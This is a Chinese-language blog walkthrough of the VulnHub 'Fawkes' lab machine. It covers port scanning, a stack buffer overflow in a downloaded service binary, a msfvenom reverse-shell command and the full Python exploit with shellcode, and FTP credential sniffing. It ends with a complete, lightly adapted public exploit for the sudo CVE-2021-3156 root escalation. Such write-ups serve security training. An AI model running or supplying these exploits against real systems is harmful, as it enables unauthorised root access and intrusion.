---
title: VulnHub-12-Fawkes
author: 干 脆 面
tags:
  - "靶机\U0001F3AF"
  - "VulnHub\U0001F3AF"
categories:
  - "安全\U0001F510"
top: 17
abbrlink: 66759de7
date: 2022-08-28 12:10:55
---

> 靶机：https://download.vulnhub.com/harrypotter/Fawkes.ova
>
> 难度：高
>
> 目标：取得 2 root 权限 + 3 Flag
>
> 备注：导入靶机时保留原始MAC地址不变（包含所有网卡的MAC地址）

<!-- more -->

### 主机发现

```
sudo arp-scan -l
```

![image-20220707113714025](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707113714025.png)

### 端口扫描

```
sudo nmap -p- 192.168.1.101
```

![image-20220707113737579](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707113737579.png)

### 服务探测

```
sudo nmap -p21,22,80,2222,9898 -sV -sC 192.168.1.101
```

![image-20220707114104530](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707114104530.png)

#### 21端口

![image-20220707114714335](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707114714335.png)

通过返回的信息可知允许匿名登录，以及存在server_hogwarts文件。

尝试搜索是否存在针对该版本的已有可利用漏洞

![image-20220707114336330](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707114336330.png)

发现该漏洞为远程拒绝服务，并不能有效帮助得到权限，不考虑

#### 22和2222端口

❓:发现目标开放的两个不同端口并安装了不同的OpenSSH本

![image-20220707114913103](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707114913103.png)

#### 访问80端口

访问后并未发现有效信息

![image-20220707115903746](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707115903746.png)

![image-20220707115925373](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707115925373.png)

进行目录扫描

![image-20220707120324816](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707120324816.png)

#### 访问9898端口

nmap未能识别出9898端口开放的服务 但是发现了一些指纹信息 其内容主要为关于电影的一些词语

![image-20220707120037025](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707120037025.png)

### ftp匿名登录

登陆后将该文件下载到本地，尝试看能否跳出当前目录未能如愿

![image-20220707120633569](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707120633569.png)

该文件为32位的ELF可执行程序

![image-20220707120900363](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707120900363.png)

在本地执行该程序（因为arm架构无法运行故下面切换windows设备进行实验），并检查是否新增了相关的进程

![image-20220707140210423](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707140210423.png)

![image-20220707140708821](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707140708821.png)

发现伴随执行后产生的进程 也开放了9898端口 联想到之前扫描目标端口开放情况时也开放的9898端口

比较一下本机和目标上的9898端口上跑的程序是否相同

本机：

```
nc 127.0.0.1 9898
```

![image-20220707141102982](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707141102982.png)

```
nc 192.168.1.101 9898
```

![image-20220707141204237](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707141204237.png)

比较结果：目标服务器上9898端口允许的服务应该就是server_hogwarts文件

### 程序调试分析

目的是想要测试该程序是否存在缓冲区溢出等漏洞

首先要关闭kali上的安全设置ALSR（避免内存地址改变，对分析过程造成干扰）

![image-20220707141603903](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707141603903.png)

安装edb-debugger

```
sudo apt install edb-debugger
```

打开server_hogwarts

![image-20220707142204812](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707142204812.png)

点击run 使用该调试器连接该文件

![image-20220707142434132](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707142434132.png)

本地再使用nc连接该程序

![image-20220707143009913](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707143009913.png)

使用python生成500个A 并写入程序可输入点执行

```
python -c "print('A'*500)"
```

![image-20220707143130756](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707143130756.png)

执行后调试工具直接报错 EIP（EIP 寄存器存放 下一个CPU指令存放的内存地址 ，当CPU执行完当前的指令后，从EIP寄存器中读取下一条指令的内存地址，然后继续执行）已经被覆盖到0x41414141 （ascii(41)=A）

![image-20220707143413107](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707143413107.png)

点击ok继续

![image-20220707143529386](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707143529386.png)

发现ESP寄存器（ESP 寄存器存放当前线程的栈顶指针（数据））内也被覆盖，报错的情况也说明了该程序确实没有对输入的数据长度进行合理的限制，基本上也确定是存在缓冲区溢出漏洞的

### 缓冲区溢出漏洞

#### 漏洞验证

生成500个不重复的字节 重新启动程序、连接调试器

```
msf-pattern_create -l 500
```

![image-20220707145119600](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707145119600.png)

![image-20220707150157494](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707150157494.png)

![image-20220707150247444](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707150247444.png)

计算偏移量

```
msf-pattern_offset -l 500 -q 64413764
```

![image-20220707150357550](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220707150357550.png)

确定了偏移量为112 后写一个python小脚本 测试112位后能否被写入到EIP寄存器内

```python
#!/usr/bin/python
import sys,socket
payload = 'A'*112 + 'B'*4 + 'C'*32
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('127.0.0.1',9898))
    s.send((payload))
    s.close()
except:
    print("Wrong!")
    sys.exit()
```

重新启动程序、连接调试器后执行脚本

![image-20220708095639705](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708095639705.png)

![image-20220708100346146](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708100346146.png)

![image-20220708100359365](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708100359365.png)

在程序执行完成（F8）后可以看到EIP寄存器内存放了0x42424242（即BBBB）也就验证了B的位置可以写入目标程序EIP寄存器内，ESP寄存器内都是C

寻找从ESP指向EIP的指令

![image-20220708100827186](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708100827186.png)

寻找具有可执行权限的

![image-20220708100952711](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708100952711.png)

![image-20220708101042151](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708101042151.png)

记录地址0x08049d55（从低位往高位写转为16进制:\x55\x9d\x04\x08） 将其写入‘BBBB’的位置

![image-20220708102335787](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708102335787.png)

#### 漏洞利用

再使用msfvenom生成后门 放入exp中

```
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.110 LPORT=4444 -b "\x00" -f py
#-b参数过滤坏字符
```

为确保程序运行的稳定性在两部分中间插入NOP空指令

![image-20220708134444432](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708134444432.png)

```python
#!/usr/bin/python
import sys,socket

buf =  b""
buf += b"\xbe\xd0\x48\x83\x8a\xdd\xc0\xd9\x74\x24\xf4\x5b\x29"
buf += b"\xc9\xb1\x12\x83\xc3\x04\x31\x73\x0e\x03\xa3\x46\x61"
buf += b"\x7f\x72\x8c\x92\x63\x27\x71\x0e\x0e\xc5\xfc\x51\x7e"
buf += b"\xaf\x33\x11\xec\x76\x7c\x2d\xde\x08\x35\x2b\x19\x60"
buf += b"\x06\x63\xd8\x1e\xee\x76\xdb\xcf\xb2\xff\x3a\x5f\x2c"
buf += b"\x50\xec\xcc\x02\x53\x87\x13\xa9\xd4\xc5\xbb\x5c\xfa"
buf += b"\x9a\x53\xc9\x2b\x72\xc1\x60\xbd\x6f\x57\x20\x34\x8e"
buf += b"\xe7\xcd\x8b\xd1"

payload = 'A'*112 + '\x55\x9d\x04\x08' + '\x90'*32 + buf
try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(('127.0.0.1',9898))
    s.send((payload))
    s.close()
except:
    print("Wrong!")
    sys.exit()
```

关闭server_hogwarts 确保进程不存在后重新启动

![image-20220708103645058](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708103645058.png)

侦听本地4444端口后执行exp 成功反弹本机shell

![image-20220708134340029](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708134340029.png)

再将exp替换为目标IP 重新监听本地4444端口后 重新执行

![image-20220708135140397](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708135140397.png)

成功反弹shell

![image-20220708140004644](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708140004644.png)

发现在当前目录下存在名为mycreds.txt的文件 查看后像是用户名密码

![image-20220708135930211](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708135930211.png)

尝试使用ssh登陆22端口 提示密码错误

![image-20220708140701588](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708140701588.png)

再尝试使用ssh登陆2222端口  登录成功

![image-20220708140736841](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708140736841.png)

发现还有其他网卡

![image-20220708140828290](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708140828290.png)

通过查看根目录下的文件 推断当前可能是在docker容器内的

![image-20220708140941575](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708140941575.png)

再查看当前用户的sudo权限 发现可以直接获取root权限

![image-20220708141143890](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708141143890.png)

在root目录下发现两个文件 horcrux1.txt为第一个flag  note.txt文件内的信息似乎有所指示

![image-20220708141641296](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708141641296.png)

### ftp明文流量分析

鉴于ftp明文传输的特性 进行流量分析

```
tcpdump -i eth0 port 21
```

![image-20220708142113110](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708142113110.png)

获取到了一组用户名和密码 不太确定使用在何处 继续尝试ssh登陆 

![image-20220708142325997](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708142325997.png)

登录成功后查看网卡信息 发现是目标ip192.168.1.101 以及发现与刚才容器内IP地址相同的docker0网卡 也说明了刚才确实是在docker容器内![image-20220708142720991](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708142720991.png)



尝试查看内核和sudo权限配置 看是否有机会能直接提权 结果并不如意

![image-20220708142645756](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708142645756.png)

通过大量的查找搜索 发现CVE-2021-3156

查看目标机器的系统和sudo版本也符合

![image-20220708143146037](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708143146037.png)

验证

### 提权

#### MSF

在msf内搜索CVE-2021-3156 发现确实存在该漏洞利用模块 但是需要获取和目标的session

![image-20220708144317862](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708144317862.png)

使用ssh模块登陆获取session

![image-20220708144652783](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708144652783.png)

在攻击模块内配置session后仍然无法成功利用

![image-20220708145500413](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220708145500413.png)

在尝试修改WritableDir目录（/home/harry）后 仍然不能成功利用

放弃使用msf 继续查找

#### 修改exp

参考链接：

https://github.com/worawit/CVE-2021-3156/blob/main/exploit_nss.py

![image-20220714144431446](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/image-20220714144431446.png)

对其代码内的SUDO_PATH进行修改:

Linux下的sudo一般存放在/usr/bin/sudo 但是目标靶机的sudo存放在/usr/local/bin/sudo 更改其地址为/usr/local/bin/sudo

![Snipaste_2022-07-14_14-18-59.png](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/1657780176484-dfa334ed-fe19-4f3a-be79-cf78c16bffd4.png)

```python
#!/usr/bin/python3
'''
Exploit for CVE-2021-3156 with overwrite struct service_user by sleepya

This exploit requires:
- glibc with tcache
- nscd service is not running

Tested on:
- Ubuntu 18.04
- Ubuntu 20.04
- Debian 10
- CentOS 8
'''
import os
import subprocess
import sys
from ctypes import cdll, c_char_p, POINTER, c_int, c_void_p

SUDO_PATH = b"/usr/local/bin/sudo"

libc = cdll.LoadLibrary("libc.so.6")

# don't use LC_ALL (6). it override other LC_
LC_CATS = [
	b"LC_CTYPE", b"LC_NUMERIC", b"LC_TIME", b"LC_COLLATE", b"LC_MONETARY",
	b"LC_MESSAGES", b"LC_ALL", b"LC_PAPER", b"LC_NAME", b"LC_ADDRESS",
	b"LC_TELEPHONE", b"LC_MEASUREMENT", b"LC_IDENTIFICATION"
]

def check_is_vuln():
	# below commands has no log because it is invalid argument for both patched and unpatched version
	# patched version, error because of '-s' argument
	# unpatched version, error because of '-A' argument but no SUDO_ASKPASS environment
	r, w = os.pipe()
	pid = os.fork()
	if not pid:
		# child
		os.dup2(w, 2)
		execve(SUDO_PATH, [ b"sudoedit", b"-s", b"-A", b"/aa", None ], [ None ])
		exit(0)
	# parent
	os.close(w)
	os.waitpid(pid, 0)
	r = os.fdopen(r, 'r')
	err = r.read()
	r.close()
	
	if "sudoedit: no askpass program specified, try setting SUDO_ASKPASS" in err:
		return True
	assert err.startswith('usage: ') or "invalid mode flags " in err, err
	return False

def create_libx(name):
	so_path = 'libnss_'+name+'.so.2'
	if os.path.isfile(so_path):
		return  # existed
	
	so_dir = 'libnss_' + name.split('/')[0]
	if not os.path.exists(so_dir):
		os.makedirs(so_dir)
	
	import zlib
	import base64

	libx_b64 = 'eNqrd/VxY2JkZIABZgY7BhBPACrkwIAJHBgsGJigbJAydgbcwJARlWYQgFBMUH0boMLodAIazQGl\neWDGQM1jRbOPDY3PhcbnZsAPsjIjDP/zs2ZlRfCzGn7z2KGflJmnX5zBEBASn2UdMZOfFQDLghD3'
	with open(so_path, 'wb') as f:
		f.write(zlib.decompress(base64.b64decode(libx_b64)))
	#os.chmod(so_path, 0o755)

def check_nscd_condition():
	if not os.path.exists('/var/run/nscd/socket'):
		return True # no socket. no service
	
	# try connect
	import socket
	sk = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
	try:
		sk.connect('/var/run/nscd/socket')
	except:
		return True
	else:
		sk.close()

	with open('/etc/nscd.conf', 'r') as f:
		for line in f:
			line = line.strip()
			if not line.startswith('enable-cache'):
				continue # comment
			service, enable = line.split()[1:]
			# in fact, if only passwd is enabled, exploit with this method is still possible (need test)
			# I think no one enable passwd but disable group
			if service == 'passwd' and enable == 'yes':
				return False
			# group MUST be disabled to exploit sudo with nss_load_library() trick
			if service == 'group' and enable == 'yes':
				return False
			
	return True

def get_libc_version():
	output = subprocess.check_output(['ldd', '--version'], universal_newlines=True)
	for line in output.split('\n'):
		if line.startswith('ldd '):
			ver_txt = line.rsplit(' ', 1)[1]
			return list(map(int, ver_txt.split('.')))
	return None

def check_libc_version():
	version = get_libc_version()
	assert version, "Cannot detect libc version"
	# this exploit only works which glibc tcache (added in 2.26)
	return version[0] >= 2 and version[1] >= 26

def check_libc_tcache():
	libc.malloc.argtypes = (c_int,)
	libc.malloc.restype = c_void_p
	libc.free.argtypes = (c_void_p,)
	# small bin or tcache
	size1, size2 = 0xd0, 0xc0
	mems = [0]*32
	# consume all size2 chunks
	for i in range(len(mems)):
		mems[i] = libc.malloc(size2)
		
	mem1 = libc.malloc(size1)
	libc.free(mem1)
	mem2 = libc.malloc(size2)
	libc.free(mem2)
	for addr in mems:
		libc.free(addr)
	return mem1 != mem2

def get_service_user_idx():
	'''Parse /etc/nsswitch.conf to find a group entry index
	'''
	idx = 0
	found = False
	with open('/etc/nsswitch.conf', 'r') as f:
		for line in f:
			if line.startswith('#'):
				continue # comment
			line = line.strip()
			if not line:
				continue # empty line
			words = line.split()
			if words[0] == 'group:':
				found = True
				break
			for word in words[1:]:
				if word[0] != '[':
					idx += 1
			
	assert found, '"group" database is not found. might be exploitable but no test'
	return idx

def get_extra_chunk_count(target_chunk_size):
	# service_user are allocated by calling getpwuid()
	# so we don't care allocation of chunk size 0x40 after getpwuid()
	# there are many string that size can be varied
	# here is the most common
	chunk_cnt = 0
	
	# get_user_info() -> get_user_groups() ->
	gids = os.getgroups()
	malloc_size = len("groups=") + len(gids) * 11
	chunk_size = (malloc_size + 8 + 15) & 0xfffffff0  # minimum size is 0x20. don't care here
	if chunk_size == target_chunk_size: chunk_cnt += 1
	
	# host=<hostname>  (unlikely)
	# get_user_info() -> sudo_gethostname()
	import socket
	malloc_size = len("host=") + len(socket.gethostname()) + 1
	chunk_size = (malloc_size + 8 + 15) & 0xfffffff0
	if chunk_size == target_chunk_size: chunk_cnt += 1
	
	# simply parse "networks=" from "ip addr" command output
	# another workaround is bruteforcing with number of 0x70
	# policy_open() -> format_plugin_settings() ->
	# a value is created from "parse_args() -> get_net_ifs()" with very large buffer
	try:
		import ipaddress
	except:
		return chunk_cnt
	cnt = 0
	malloc_size = 0
	proc = subprocess.Popen(['ip', 'addr'], stdout=subprocess.PIPE, bufsize=1, universal_newlines=True)
	for line in proc.stdout:
		line = line.strip()
		if not line.startswith('inet'):
			continue
		if cnt < 2: # skip first 2 address (lo interface)
			cnt += 1
			continue;
		addr = line.split(' ', 2)[1]
		mask = str(ipaddress.ip_network(addr if sys.version_info >= (3,0,0) else addr.decode("UTF-8"), False).netmask)
		malloc_size += addr.index('/') + 1 + len(mask)
		cnt += 1
	malloc_size += len("network_addrs=") + cnt - 3 + 1
	chunk_size = (malloc_size + 8 + 15) & 0xfffffff0
	if chunk_size == target_chunk_size: chunk_cnt += 1
	proc.wait()
	
	return chunk_cnt

def execve(filename, argv, envp):
	libc.execve.argtypes = c_char_p,POINTER(c_char_p),POINTER(c_char_p)
	
	cargv = (c_char_p * len(argv))(*argv)
	cenvp = (c_char_p * len(envp))(*envp)

	libc.execve(filename, cargv, cenvp)

def lc_env(cat_id, chunk_len):
	name = b"C.UTF-8@"
	name = name.ljust(chunk_len - 0x18, b'Z')
	return LC_CATS[cat_id]+b"="+name


assert check_is_vuln(), "target is patched"
assert check_libc_version(), "glibc is too old. The exploit is relied on glibc tcache feature. Need version >= 2.26"
assert check_libc_tcache(), "glibc tcache is not found"
assert check_nscd_condition(), "nscd service is running, exploit is impossible with this method"
service_user_idx = get_service_user_idx()
assert service_user_idx < 9, '"group" db in nsswitch.conf is too far, idx: %d' % service_user_idx
create_libx("X/X1234")

# Note: actions[5] can be any value. library and known MUST be NULL
FAKE_USER_SERVICE_PART = [ b"\\" ] * 0x18 + [ b"X/X1234\\" ]

TARGET_OFFSET_START = 0x780
FAKE_USER_SERVICE = FAKE_USER_SERVICE_PART*30
FAKE_USER_SERVICE[-1] = FAKE_USER_SERVICE[-1][:-1]  # remove last '\\'. stop overwritten

CHUNK_CMND_SIZE = 0xf0

# Allow custom extra_chunk_cnt incase unexpected allocation
# Note: this step should be no need when CHUNK_CMND_SIZE is 0xf0
extra_chunk_cnt = get_extra_chunk_count(CHUNK_CMND_SIZE) if len(sys.argv) < 2 else int(sys.argv[1])

argv = [ b"sudoedit", b"-A", b"-s", b"A"*(CHUNK_CMND_SIZE-0x10)+b"\\", None ]
env = [ b"Z"*(TARGET_OFFSET_START + 0xf - 8 - 1) + b"\\" ] + FAKE_USER_SERVICE
# first 2 chunks are fixed. chunk40 (target service_user) is overwritten from overflown cmnd (in get_cmnd)
env.extend([ lc_env(0, 0x40)+b";A=", lc_env(1, CHUNK_CMND_SIZE) ])

# add free chunks that created before target service_user
for i in range(2, service_user_idx+2):
	# skip LC_ALL (6)
	env.append(lc_env(i if i < 6 else i+1, 0x40))
if service_user_idx == 0:
	env.append(lc_env(2, 0x20)) # for filling hole

for i in range(11, 11-extra_chunk_cnt, -1):
	env.append(lc_env(i, CHUNK_CMND_SIZE))

env.append(lc_env(12, 0x90)) # for filling holes from freed file buffer
env.append(b"TZ=:")  # shortcut tzset function
# don't put "SUDO_ASKPASS" environment. sudo will fail without logging if no segfault
env.append(None)

execve(SUDO_PATH, argv, env)
```

将修改后的exp.py利用nc传输到目标靶机内

```
nc -nvlp 4444 > exp.py
```

```
nc 192.168.1.101 4444 < exploit_nss.py -w 1
```

![Snipaste_2022-07-14_14-25-01.png](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/1657780176472-335a6e92-80e3-4a0c-904a-2f6efc0c9235.png)

执行exp成功提权为root 并发现第二个flag

![Snipaste_2022-07-14_14-27-54.png](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/1657780176496-6f84835e-2a20-4236-af70-22b573b685fe.png)

切换到root目录下 发现第三个flag

![Snipaste_2022-07-14_14-28-17.png](https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/2022/07/14/1657780176637-be6fd5c7-5de9-4617-877e-ca6f7f07caee.png)
